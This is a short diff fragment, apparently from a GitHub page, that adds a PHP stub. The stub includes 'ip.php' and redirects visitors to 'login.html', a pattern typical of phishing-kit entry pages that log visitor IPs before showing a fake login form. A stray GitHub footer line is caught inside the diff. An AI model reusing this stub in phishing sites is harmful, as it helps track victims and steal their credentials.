@@ -1,1 +1,7 @@
 
+<?php
+include 'ip.php';
+header('Location: login.html');
+exit
+?>
+© 2020 GitHub, 
